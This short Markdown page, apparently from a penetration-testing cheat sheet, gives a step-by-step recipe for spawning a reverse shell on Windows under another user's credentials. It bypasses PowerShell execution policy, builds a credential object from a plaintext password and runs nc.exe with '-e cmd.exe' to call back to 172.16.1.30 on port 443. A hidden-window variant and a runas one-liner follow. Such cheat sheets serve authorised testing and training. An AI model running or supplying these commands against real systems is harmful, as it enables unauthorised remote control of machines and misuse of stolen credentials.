---
title: RunAs
parent: General Usage
layout: default
nav_order: 2
---

## Reverse Shell
1. First get a powershell, or `powershell -ep bypass`
2. `$secpasswd = ConvertTo-SecureString "Password" -AsPlainText -Force`
3. `$mycreds = New-Object System.Management.Automation.PSCredential ("domain.com\username", $secpasswd)`
4. `Start-Process -FilePath powershell.exe -argumentlist "C:\temp\nc.exe 172.16.1.30 443 -e cmd.exe" -Credential $mycreds`
5. (Optional), can replace step 4 with hidden window:\
   `Start-Process -FilePath powershell.exe -argumentlist "-w hidden -c C:\temp\nc.exe 172.16.1.30 443 -e cmd.exe" -Credential $mycreds`

## Command only
`runas /env /profile /user:domain\user "command to run"`